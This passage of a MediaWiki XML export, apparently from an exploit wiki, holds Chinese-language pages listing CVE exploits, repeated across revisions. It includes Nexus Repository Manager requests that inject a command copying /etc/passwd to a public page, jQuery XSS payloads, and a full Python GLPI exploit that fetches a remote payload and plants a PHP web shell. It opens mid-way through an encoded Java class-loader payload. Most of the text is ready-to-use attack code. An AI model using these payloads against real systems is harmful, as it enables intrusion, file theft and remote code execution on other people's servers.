9$I$Hoa$FC$ac$ea$l$K$Y$l$ea$l$aa3$5b$fa$T$ad7$b0$dal$z$a03$R$99$c5$9a$a1Y$ac$j2$p$F$ac$9bAt$G$5d$89$b6Yt$b3$b6$eb$T$ed$s$e3m$YJt$dcE$d8l7$Zs$a3$R$e3r$7cj$ee$j$b3$bd$80x$c24$c3$a6Y$c0$s$93$f9$3f$3c$85$ba$84$fe$a2$s$a6$de$7d$7b$K$81C$d3$bc$d8IqI$5c$c6fh$e2$aax$D$8f$m$e0_$f5U$ac$e3Z$cf$fehD$IM$fcxn$c6r$84$d99m$d4t$b0CL$f6$cdr$f4$e2$n$i$e4Go$3f5CX$8d$i$3a1$c9$af$e5$L$b4z$JQ$5cF$X$5e$c7z$5c$c7$G$be$93b$f8$t6$e1$k$k$W$3a6$8b$u$k$R$bb$b0E$3c$89$ad$e2$Zl$T6$k$TYl$X$_$60$87$b8$88$5d$e2$V$ec$W$97$d0Kt$3d$e25$ac$WW$b1$9f$I$f7$89k$3cQ$b6$e0$3bhg$ec$7b$d8$8d$P$T$e5u$fc$h$8f$a3$87ho$e2_$d8CY$TO$7b$8b$I$7b$88$fd$k$z$9f$c0$5e$b4$f0$e4$8b$d8G$99$c1$f3$cf$e0I$ecG$98$u$Gq$80Q$5b$89$a5$P$87$f8$3fBD$8f$e20$8e$a0$8d$b8bx$KG$d1$$$c6$99$d9G$Y$a5$83$f8t$i$e3$93$89$L$c2$60$f6$3d$dc$e7$c4$g$M$f0$a9$B$n$f1j$89Wm$e2e$3c$cd$e8$C$ab$c4$f38Nm$N$d6$89$b3$f8$u$f1$d5$o$$$iVm$905$ef$V$c38$81a$S$ea$a0$Y$c03$d4$G$d1$_$O$e1c$d4$w$f8$b8$8cD$cfb$b6$cf2$dbb$8e$cf2$c7OP7$8d$fa9$d8hP$60$v$YQ$c0o$80$93$feCh$feA$90$aes$fc$d7$f1$be6$be$b8$a8$99_m$7f$3d$a5$60T$c1$98$82$94$82$d3$c0$7f$b1$8c$9a9$Y$d0$l$U$Q$d8$a3$e0$cc$7f$m$e6$98$j$fc$5dZ$8e$9eq$7f$aed$fe$H$c3$e0$Q$5e$fb$N$A$A').newInstance()}"]
        }
}


&lt;/pre&gt;
&lt;translate&gt;
==參考== &lt;!--T:6--&gt;
&lt;/translate&gt;
https://short.pwnwiki.org/?c=Al2liL</text>
      <sha1>m2hsz0sw3zy3bzq491yih9cq5jzu3u8</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-10204 Nexus Repository Manger extdirect 後台遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>5647</id>
    <revision>
      <id>6489</id>
      <timestamp>2021-07-08T06:30:09Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==漏洞影響== &lt;/translate&gt; Nexus &lt; 3.21.1  &lt;translate&gt; ==前提條件== &lt;/translate&gt; &lt;translate&gt; 漏洞觸發需要任意賬戶權限 &lt;/translate&gt;..."</comment>
      <origin>6489</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1975" sha1="6nhzd4kh9f8thn8dyxbh7eyrjfgvvmd" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;
Nexus &lt; 3.21.1

&lt;translate&gt;
==前提條件==
&lt;/translate&gt;
&lt;translate&gt;
漏洞觸發需要任意賬戶權限
&lt;/translate&gt;
&lt;translate&gt;
==漏洞利用==
&lt;/translate&gt;
&lt;translate&gt;
該漏洞需要訪問更新角色或創建角色接口，登錄任意用戶後修改 NXSESSIONID

發送請求包執行命令
&lt;/translate&gt;
&lt;pre&gt;
POST /service/extdirect HTTP/1.1
Host: 
accept: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
NX-ANTI-CSRF-TOKEN: 0.856555763510765
Content-Type: application/json
Cookie: jenkins-timestamper-offset=-28800000; Hm_lvt_8346bb07e7843cd10a2ee33017b3d627=1583249520; NX-ANTI-CSRF-TOKEN=0.856555763510765; NXSESSIONID=e9d6620d-6843-49a6-a887-cd7cef74d413
Content-Length: 304


{"action":"coreui_Role","method":"create","data":[{"version":"","source":"default","id":"1111","name":"2222","description":"3333","privileges":["$\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('cp /etc/passwd ./public/vuln.html')}"],"roles":[]}],"type":"rpc","tid":89}

&lt;/pre&gt;

&lt;translate&gt;
另外一個漏洞點
&lt;/translate&gt;
&lt;pre&gt;
POST /service/extdirect HTTP/1.1
Host: 
accept: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
NX-ANTI-CSRF-TOKEN: 0.856555763510765
Content-Type: application/json
Cookie: jenkins-timestamper-offset=-28800000; Hm_lvt_8346bb07e7843cd10a2ee33017b3d627=1583249520; NX-ANTI-CSRF-TOKEN=0.856555763510765; NXSESSIONID=e9d6620d-6843-49a6-a887-cd7cef74d413
Content-Length: 304


{"action":"coreui_User","method":"update","data":[{"userId":"www","version":"2","firstName":"www","lastName":"www","email":"www@qq.com","status":"active","roles":["$\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('cp /etc/passwd ./public/vuln.html')}"]}],"type":"rpc","tid":9}

&lt;/pre&gt;</text>
      <sha1>6nhzd4kh9f8thn8dyxbh7eyrjfgvvmd</sha1>
    </revision>
    <revision>
      <id>6490</id>
      <parentid>6489</parentid>
      <timestamp>2021-07-08T06:30:39Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>6490</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2052" sha1="306qdgwkpaay5xcgnc2k6dbgksi5rtl" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;
Nexus &lt; 3.21.1

&lt;translate&gt;
==前提條件== &lt;!--T:2--&gt;
&lt;/translate&gt;
&lt;translate&gt;
&lt;!--T:3--&gt;
漏洞觸發需要任意賬戶權限
&lt;/translate&gt;
&lt;translate&gt;
==漏洞利用== &lt;!--T:4--&gt;
&lt;/translate&gt;
&lt;translate&gt;
&lt;!--T:5--&gt;
該漏洞需要訪問更新角色或創建角色接口，登錄任意用戶後修改 NXSESSIONID

&lt;!--T:6--&gt;
發送請求包執行命令
&lt;/translate&gt;
&lt;pre&gt;
POST /service/extdirect HTTP/1.1
Host: 
accept: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
NX-ANTI-CSRF-TOKEN: 0.856555763510765
Content-Type: application/json
Cookie: jenkins-timestamper-offset=-28800000; Hm_lvt_8346bb07e7843cd10a2ee33017b3d627=1583249520; NX-ANTI-CSRF-TOKEN=0.856555763510765; NXSESSIONID=e9d6620d-6843-49a6-a887-cd7cef74d413
Content-Length: 304


{"action":"coreui_Role","method":"create","data":[{"version":"","source":"default","id":"1111","name":"2222","description":"3333","privileges":["$\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('cp /etc/passwd ./public/vuln.html')}"],"roles":[]}],"type":"rpc","tid":89}

&lt;/pre&gt;

&lt;translate&gt;
&lt;!--T:7--&gt;
另外一個漏洞點
&lt;/translate&gt;
&lt;pre&gt;
POST /service/extdirect HTTP/1.1
Host: 
accept: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
NX-ANTI-CSRF-TOKEN: 0.856555763510765
Content-Type: application/json
Cookie: jenkins-timestamper-offset=-28800000; Hm_lvt_8346bb07e7843cd10a2ee33017b3d627=1583249520; NX-ANTI-CSRF-TOKEN=0.856555763510765; NXSESSIONID=e9d6620d-6843-49a6-a887-cd7cef74d413
Content-Length: 304


{"action":"coreui_User","method":"update","data":[{"userId":"www","version":"2","firstName":"www","lastName":"www","email":"www@qq.com","status":"active","roles":["$\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('cp /etc/passwd ./public/vuln.html')}"]}],"type":"rpc","tid":9}

&lt;/pre&gt;</text>
      <sha1>306qdgwkpaay5xcgnc2k6dbgksi5rtl</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-10204 Nexus Repository Manger extdirect 後台遠程命令執行漏洞/zh-hant</title>
    <ns>0</ns>
    <id>6098</id>
    <revision>
      <id>6968</id>
      <timestamp>2021-07-10T08:24:41Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "漏洞觸發需要任意賬戶權限"</comment>
      <origin>6968</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1825" sha1="f5q51s5ie2nnpbuofr72h6ryjcoyav8" xml:space="preserve">&lt;languages /&gt;
==漏洞影響==
Nexus &lt; 3.21.1

==前提條件==
漏洞觸發需要任意賬戶權限
==漏洞利用==
該漏洞需要訪問更新角色或創建角色接口，登錄任意用戶後修改 NXSESSIONID

發送請求包執行命令
&lt;pre&gt;
POST /service/extdirect HTTP/1.1
Host: 
accept: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
NX-ANTI-CSRF-TOKEN: 0.856555763510765
Content-Type: application/json
Cookie: jenkins-timestamper-offset=-28800000; Hm_lvt_8346bb07e7843cd10a2ee33017b3d627=1583249520; NX-ANTI-CSRF-TOKEN=0.856555763510765; NXSESSIONID=e9d6620d-6843-49a6-a887-cd7cef74d413
Content-Length: 304


{"action":"coreui_Role","method":"create","data":[{"version":"","source":"default","id":"1111","name":"2222","description":"3333","privileges":["$\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('cp /etc/passwd ./public/vuln.html')}"],"roles":[]}],"type":"rpc","tid":89}

&lt;/pre&gt;

另外一個漏洞點
&lt;pre&gt;
POST /service/extdirect HTTP/1.1
Host: 
accept: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
NX-ANTI-CSRF-TOKEN: 0.856555763510765
Content-Type: application/json
Cookie: jenkins-timestamper-offset=-28800000; Hm_lvt_8346bb07e7843cd10a2ee33017b3d627=1583249520; NX-ANTI-CSRF-TOKEN=0.856555763510765; NXSESSIONID=e9d6620d-6843-49a6-a887-cd7cef74d413
Content-Length: 304


{"action":"coreui_User","method":"update","data":[{"userId":"www","version":"2","firstName":"www","lastName":"www","email":"www@qq.com","status":"active","roles":["$\\A{''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('cp /etc/passwd ./public/vuln.html')}"]}],"type":"rpc","tid":9}

&lt;/pre&gt;</text>
      <sha1>f5q51s5ie2nnpbuofr72h6ryjcoyav8</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-10977 Gitlab CEEE任意文件讀取&amp;遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>1341</id>
    <revision>
      <id>1681</id>
      <timestamp>2021-04-15T06:39:17Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==影響版本== GitLab GitLab CE/EE &gt;=8.5 and &lt;=12.9  GitLab GitLab CE &gt;=8.5，&lt;=12.9   ==POC== https://github.com/thewhiteh4t/cve-2020-10977"</comment>
      <origin>1681</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="142" sha1="tsxzshwpqdd0m3k2j5xhbfllsxd9zom" xml:space="preserve">==影響版本==
GitLab GitLab CE/EE &gt;=8.5 and &lt;=12.9

GitLab GitLab CE &gt;=8.5，&lt;=12.9


==POC==
https://github.com/thewhiteh4t/cve-2020-10977</text>
      <sha1>tsxzshwpqdd0m3k2j5xhbfllsxd9zom</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-11022 jQuery 1.2 XSS漏洞</title>
    <ns>0</ns>
    <id>1330</id>
    <revision>
      <id>1670</id>
      <timestamp>2021-04-15T02:56:21Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==XSS== &lt;pre&gt; &lt;option&gt;&lt;style&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/style&gt; &lt;/pre&gt;"</comment>
      <origin>1670</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="90" sha1="d6qv50r55k12k69pdu03bhzxr7to03j" xml:space="preserve">==XSS==
&lt;pre&gt;
&lt;option&gt;&lt;style&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/style&gt;
&lt;/pre&gt;</text>
      <sha1>d6qv50r55k12k69pdu03bhzxr7to03j</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-11023 jQuery 1.0.3 XSS漏洞</title>
    <ns>0</ns>
    <id>1331</id>
    <revision>
      <id>1671</id>
      <timestamp>2021-04-15T02:57:11Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==XSS== &lt;pre&gt; &lt;img alt="&lt;x" title="/&gt;&lt;img src=x onerror=alert(1)&gt;"&gt; &lt;/pre&gt;"</comment>
      <origin>1671</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="74" sha1="7hmqt14tuwwxexoh9791kbe3fncd9if" xml:space="preserve">==XSS==
&lt;pre&gt;
&lt;img alt="&lt;x" title="/&gt;&lt;img src=x onerror=alert(1)&gt;"&gt;
&lt;/pre&gt;</text>
      <sha1>7hmqt14tuwwxexoh9791kbe3fncd9if</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-11060 GLPI 9.4.5 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>4380</id>
    <revision>
      <id>5045</id>
      <timestamp>2021-06-15T01:19:19Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==影響版本== &lt;/translate&gt; &lt;pre&gt; Version: &lt; 9.4.6 &lt;/pre&gt;  ==EXP== &lt;pre&gt; # Exploit Title: GLPI 9.4.5 - Remote Code Execution (RCE) # Exploit Author..."</comment>
      <origin>5045</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="8658" sha1="ar6g9haus5vob902pqr9hoy4tytdoyn" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本==
&lt;/translate&gt;
&lt;pre&gt;
Version: &lt; 9.4.6
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
# Exploit Title: GLPI 9.4.5 - Remote Code Execution (RCE)
# Exploit Author: Brian Peters
# Vendor Homepage: https://glpi-project.org
# Software Link: https://github.com/glpi-project/glpi/releases
# Version: &lt; 9.4.6
# CVE: CVE-2020-11060

# Download a SQL dump and find the table offset for "wifinetworks" with 
# cat &lt;sqlfile&gt; | grep "CREATE TABLE" | grep -n wifinetworks
# Update the offsettable value with this number in the create_dump function
# The Nix/Win paths are based on defaults. You can use curl -I &lt;url&gt; and use md5sum to find the path based
# on the Set-Cookie hash.

#!/usr/bin/python

import argparse
import json
import random
import re
import requests
import string
import sys
import time
from datetime import datetime
from lxml import html

class GlpiBrowser:
    
    def __init__(self, url, user, password, platform):
        self.url = url
        self.user = user
        self.password = password
        self.platform = platform
        
        self.session = requests.Session()
        self.session.verify = False
        requests.packages.urllib3.disable_warnings()
    
    def extract_csrf(self, html):
        return re.findall('name="_glpi_csrf_token" value="([a-f0-9]{32})"', html)[0]
    
    def get_login_data(self):
        r = self.session.get('{0}'.format(self.url), allow_redirects=True)
        
        csrf_token = self.extract_csrf(r.text)
        name_field = re.findall('name="(.*)" id="login_name"', r.text)[0]
        pass_field = re.findall('name="(.*)" id="login_password"', r.text)[0]
        
        return name_field, pass_field, csrf_token
    
    def login(self):
        try:
            name_field, pass_field, csrf_token = self.get_login_data()
        except Exception as e:
            print "[-] Login error: could not retrieve form data"
            sys.exit(1)
        
        data = {
            name_field: self.user, 
            pass_field: self.password,
            "auth": "local",
            "submit": "Post",
            "_glpi_csrf_token": csrf_token
        }
        
        r = self.session.post('{}/front/login.php'.format(self.url), data=data, allow_redirects=False)
        
        return r.status_code == 302
        
    def wipe_networks(self, padding, datemod):
        r = self.session.get('https://raw.githubusercontent.com/AlmondOffSec/PoCs/master/glpi_rce_gzip/poc.txt')
        comment = r.content
        
        r = self.session.get('{0}/front/wifinetwork.php#modal_massaction_contentb5e83b3aa28f203595c34c5dbcea85c9'.format(self.url))
        try:
            csrf_token = self.extract_csrf(r.text)
        except Exception as e:
            print "[-] Edit network error: could not retrieve form data"
            sys.exit(1)
            
        webpage = html.fromstring(r.content)
        links = webpage.xpath('//a/@href')
        for rawlink in links:
            if "wifinetwork.form.php?id=" in rawlink:
        	rawlinkparts = rawlink.split("=")
        	networkid = rawlinkparts[-1]
        	print "Deleting network "+networkid
        	
        	data = {
        	    "entities_id": "0",
	            "is_recursive": "0",
        	    "name": "PoC",
        	    "comment": comment,
        	    "essid": "RCE"+padding,
        	    "mode": "ad-hoc",
		    "purge": "Delete permanently",
		    "id": networkid,
                    "_glpi_csrf_token": csrf_token,
                    '_read_date_mod': datemod
                }
        
                r = self.session.post('{}/front/wifinetwork.form.php'.format(self.url), data=data)
    
    def create_network(self, datemod):
        r = self.session.get('https://raw.githubusercontent.com/AlmondOffSec/PoCs/master/glpi_rce_gzip/poc.txt')
        comment = r.content

        r = self.session.get('{0}/front/wifinetwork.php'.format(self.url))
        try:
            csrf_token = self.extract_csrf(r.text)
        except Exception as e:
            print "[-] Create network error: could not retrieve form data"
            sys.exit(1)
        
        data = {
	    "entities_id": "0",
	    "is_recursive": "0",
	    "name": "PoC",
	    "comment": comment,
	    "essid": "RCE",
	    "mode": "ad-hoc",
	    "add": "ADD",
            "_glpi_csrf_token": csrf_token,
            '_read_date_mod': datemod
        }
        
        r = self.session.post('{}/front/wifinetwork.form.php'.format(self.url), data=data)
        print "[+] Network created"
        print "      Name: PoC"
        print "      ESSID: RCE"
        
    def edit_network(self, padding, datemod):
        r = self.session.get('https://raw.githubusercontent.com/AlmondOffSec/PoCs/master/glpi_rce_gzip/poc.txt')
        comment = r.content
        #create the padding for the name and essid
        
        
        r = self.session.get('{0}/front/wifinetwork.php'.format(self.url))
        webpage = html.fromstring(r.content)
        links = webpage.xpath('//a/@href')
        for rawlink in links:
            if "wifinetwork.form.php?id=" in rawlink:
                rawlinkparts = rawlink.split('/')
                link = rawlinkparts[-1]
                
                #edit the network name and essid
                r = self.session.get('{0}/front/{1}'.format(self.url, link))
                try:
            	    csrf_token = self.extract_csrf(r.text)
        	except Exception as e:
        	    print "[-] Edit network error: could not retrieve form data"
        	    sys.exit(1)
        	    
        	rawlinkparts = rawlink.split("=")
        	networkid = rawlinkparts[-1]
        	        	    
                data = {
        	    "entities_id": "0",
        	    "is_recursive": "0",
        	    "name": "PoC",
        	    "comment": comment,
        	    "essid": "RCE"+padding,
        	    "mode": "ad-hoc",
        	    "update": "Save",
        	    "id": networkid,
                    "_glpi_csrf_token": csrf_token,
                    "_read_date_mod": datemod
                }
                r = self.session.post('{0}/front/wifinetwork.form.php'.format(self.url), data=data)
                print "[+] Network mofified"
                print "      New ESSID: RCE"+padding
    
    def create_dump(self, shellname):
        path=''
        if self.platform == "Win":
            path="C:\\xampp\\htdocs\\pics\\"
        elif self.platform == "Nix":
            path="/var/www/html/glpi/pics/"
        
        #adjust offset number to match the table number for wifi_networks
        #this can be found by downloading a SQL dump and running cat &lt;dumpname&gt; | grep "CREATE TABLE" | grep -n "wifinetworks"
        r = self.session.get('{0}/front/backup.php?dump=dump&amp;offsettable=312&amp;fichier={1}{2}'.format(self.url, path, shellname))
        
        print '[+] Shell: {0}/pics/{1}'.format(self.url, shellname)
        
    def shell_check(self, shellname):
        r = self.session.get('{0}/pics/{1}?0=echo%20asdfasdfasdf'.format(self.url, shellname))
        print "      Shell size: "+str(len(r.content))
        if "asdfasdfasdf" in r.content:
            print "[+] RCE FOUND!"
            sys.exit(1)
        return len(r.content)
    
    def pwn(self):
        if not self.login():
            print "[-] Login error"
            return
        else:
            print "[+] Logged in"

	#create timestamp
	now = datetime.now()
	datemod = now.strftime("%Y-%m-%d %H:%M:%S")

        #create comment payload
        
        tick=1
	while True:
	    #create random shell name
            letters = string.ascii_letters
	    shellname = ''.join(random.choice(letters) for i in range(8))+".php"
	    
	    #create padding for ESSID
	    padding = ''
            for i in range(1,int(tick)+1):
                padding+=str(i)
	    
	    self.wipe_networks(padding, datemod)
	    self.create_network(datemod)
            self.edit_network(padding, datemod)            
            self.create_dump(shellname)
            self.shell_check(shellname)
	    print "\n"
            raw_input("Press any key to continue with the next iteration...")
            tick+=1

        return
        
if __name__ == '__main__':
    
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", help="Target URL", required=True)
    parser.add_argument("--user", help="Username", required=True)
    parser.add_argument("--password", help="Password", required=True)
    parser.add_argument("--platform", help="Win/Nix", required=True)
    
    args = parser.parse_args()
    
    g = GlpiBrowser(args.url, user=args.user, password=args.password, platform=args.platform)
    
    g.pwn()
&lt;/pre&gt;</text>
      <sha1>ar6g9haus5vob902pqr9hoy4tytdoyn</sha1>
    </revision>
    <revision>
      <id>5046</id>
      <parentid>5045</parentid>
      <timestamp>2021-06-15T01:19:55Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>5046</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="8669" sha1="41fck8bxol60y4n0xbh5epw0rhh6o9x" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
Version: &lt; 9.4.6
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
# Exploit Title: GLPI 9.4.5 - Remote Code Execution (RCE)
# Exploit Author: Brian Peters
# Vendor Homepage: https://glpi-project.org
# Software Link: https://github.com/glpi-project/glpi/releases
# Version: &lt; 9.4.6
# CVE: CVE-2020-11060

# Download a SQL dump and find the table offset for "wifinetworks" with 
# cat &lt;sqlfile&gt; | grep "CREATE TABLE" | grep -n wifinetworks
# Update the offsettable value with this number in the create_dump function
# The Nix/Win paths are based on defaults. You can use curl -I &lt;url&gt; and use md5sum to find the path based
# on the Set-Cookie hash.

#!/usr/bin/python

import argparse
import json
import random
import re
import requests
import string
import sys
import time
from datetime import datetime
from lxml import html

class GlpiBrowser:
    
    def __init__(self, url, user, password, platform):
        self.url = url
        self.user = user
        self.password = password
        self.platform = platform
        
        self.session = requests.Session()
        self.session.verify = False
        requests.packages.urllib3.disable_warnings()
    
    def extract_csrf(self, html):
        return re.findall('name="_glpi_csrf_token" value="([a-f0-9]{32})"', html)[0]
    
    def get_login_data(self):
        r = self.session.get('{0}'.format(self.url), allow_redirects=True)
        
        csrf_token = self.extract_csrf(r.text)
        name_field = re.findall('name="(.*)" id="login_name"', r.text)[0]
        pass_field = re.findall('name="(.*)" id="login_password"', r.text)[0]
        
        return name_field, pass_field, csrf_token
    
    def login(self):
        try:
            name_field, pass_field, csrf_token = self.get_login_data()
        except Exception as e:
            print "[-] Login error: could not retrieve form data"
            sys.exit(1)
        
        data = {
            name_field: self.user, 
            pass_field: self.password,
            "auth": "local",
            "submit": "Post",
            "_glpi_csrf_token": csrf_token
        }
        
        r = self.session.post('{}/front/login.php'.format(self.url), data=data, allow_redirects=False)
        
        return r.status_code == 302
        
    def wipe_networks(self, padding, datemod):
        r = self.session.get('https://raw.githubusercontent.com/AlmondOffSec/PoCs/master/glpi_rce_gzip/poc.txt')
        comment = r.content
        
        r = self.session.get('{0}/front/wifinetwork.php#modal_massaction_contentb5e83b3aa28f203595c34c5dbcea85c9'.format(self.url))
        try:
            csrf_token = self.extract_csrf(r.text)
        except Exception as e:
            print "[-] Edit network error: could not retrieve form data"
            sys.exit(1)
            
        webpage = html.fromstring(r.content)
        links = webpage.xpath('//a/@href')
        for rawlink in links:
            if "wifinetwork.form.php?id=" in rawlink:
        	rawlinkparts = rawlink.split("=")
        	networkid = rawlinkparts[-1]
        	print "Deleting network "+networkid
        	
        	data = {
        	    "entities_id": "0",
	            "is_recursive": "0",
        	    "name": "PoC",
        	    "comment": comment,
        	    "essid": "RCE"+padding,
        	    "mode": "ad-hoc",
		    "purge": "Delete permanently",
		    "id": networkid,
                    "_glpi_csrf_token": csrf_token,
                    '_read_date_mod': datemod
                }
        
                r = self.session.post('{}/front/wifinetwork.form.php'.format(self.url), data=data)
    
    def create_network(self, datemod):
        r = self.session.get('https://raw.githubusercontent.com/AlmondOffSec/PoCs/master/glpi_rce_gzip/poc.txt')
        comment = r.content

        r = self.session.get('{0}/front/wifinetwork.php'.format(self.url))
        try:
            csrf_token = self.extract_csrf(r.text)
        except Exception as e:
            print "[-] Create network error: could not retrieve form data"
            sys.exit(1)
        
        data = {
	    "entities_id": "0",
	    "is_recursive": "0",
	    "name": "PoC",
	    "comment": comment,
	    "essid": "RCE",
	    "mode": "ad-hoc",
	    "add": "ADD",
            "_glpi_csrf_token": csrf_token,
            '_read_date_mod': datemod
        }
        
        r = self.session.post('{}/front/wifinetwork.form.php'.format(self.url), data=data)
        print "[+] Network created"
        print "      Name: PoC"
        print "      ESSID: RCE"
        
    def edit_network(self, padding, datemod):
        r = self.session.get('https://raw.githubusercontent.com/AlmondOffSec/PoCs/master/glpi_rce_gzip/poc.txt')
        comment = r.content
        #create the padding for the name and essid
        
        
        r = self.session.get('{0}/front/wifinetwork.php'.format(self.url))
        webpage = html.fromstring(r.content)
        links = webpage.xpath('//a/@href')
        for rawlink in links:
            if "wifinetwork.form.php?id=" in rawlink:
                rawlinkparts = rawlink.split('/')
                link = rawlinkparts[-1]
                
                #edit the network name and essid
                r = self.session.get('{0}/front/{1}'.format(self.url, link))
                try:
            	    csrf_token = self.extract_csrf(r.text)
        	except Exception as e:
        	    print "[-] Edit network error: could not retrieve form data"
        	    sys.exit(1)
        	    
        	rawlinkparts = rawlink.split("=")
        	networkid = rawlinkparts[-1]
        	        	    
                data = {
        	    "entities_id": "0",
        	    "is_recursive": "0",
        	    "name": "PoC",
        	    "comment": comment,
        	    "essid": "RCE"+padding,
        	    "mode": "ad-hoc",
        	    "update": "Save",
        	    "id": networkid,
                    "_glpi_csrf_token": csrf_token,
                    "_read_date_mod": datemod
                }
                r = self.session.post('{0}/front/wifinetwork.form.php'.format(self.url), data=data)
                print "[+] Network mofified"
                print "      New ESSID: RCE"+padding
    
    def create_dump(self, shellname):
        path=''
        if self.platform == "Win":
            path="C:\\xampp\\htdocs\\pics\\"
        elif self.platform == "Nix":
            path="/var/www/html/glpi/pics/"
        
        #adjust offset number to match the table number for wifi_networks
        #this can be found by downloading a SQL dump and running cat &lt;dumpname&gt; | grep "CREATE TABLE" | grep -n "wifinetworks"
        r = self.session.get('{0}/front/backup.php?dump=dump&amp;offsettable=312&amp;fichier={1}{2}'.format(self.url, path, shellname))
        
        print '[+] Shell: {0}/pics/{1}'.format(self.url, shellname)
        
    def shell_check(self, shellname):
        r = self.session.get('{0}/pics/{1}?0=echo%20asdfasdfasdf'.format(self.url, shellname))
        print "      Shell size: "+str(len(r.content))
        if "asdfasdfasdf" in r.content:
            print "[+] RCE FOUND!"
            sys.exit(1)
        return len(r.content)
    
    def pwn(self):
        if not self.login():
            print "[-] Login error"
            return
        else:
            print "[+] Logged in"

	#create timestamp
	now = datetime.now()
	datemod = now.strftime("%Y-%m-%d %H:%M:%S")

        #create comment payload
        
        tick=1
	while True:
	    #create random shell name
            letters = string.ascii_letters
	    shellname = ''.join(random.choice(letters) for i in range(8))+".php"
	    
	    #create padding for ESSID
	    padding = ''
            for i in range(1,int(tick)+1):
                padding+=str(i)
	    
	    self.wipe_networks(padding, datemod)
	    self.create_network(datemod)
            self.edit_network(padding, datemod)            
            self.create_dump(shellname)
            self.shell_check(shellname)
	    print "\n"
            raw_input("Press any key to continue with the next iteration...")
            tick+=1

        return
        
if __name__ == '__main__':
    
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", help="Target URL", required=True)
    parser.add_argument("--user", help="Username", required=True)
    parser.add_argument("--password", help="Password", required=True)
    parser.add_argument("--platform", help="Win/Nix", required=True)
    
    args = parser.parse_args()
    
    g = GlpiBrowser(args.url, user=args.user, password=args.password, platform=args.platform)
    
    g.pwn()
&lt;/pre&gt;</text>
      <sha1>41fck8bxol60y4n0xbh5epw0rhh6o9x</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-11060 GLPI 9.4.5 遠程代碼執行漏洞/ru</title>
    <ns>0</ns>
    <id>4480</id>
    <revision>
      <id>5157</id>
      <timestamp>2021-06-16T02:18:00Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Затронутая версия=="</comment>
      <origin>5157</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="8654" sha1="smxecxf415v47bpwpzcih77no6qkcaw" xml:space="preserve">&lt;languages /&gt;
==Затронутая версия==
&lt;pre&gt;
Version: &lt; 9.4.6
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
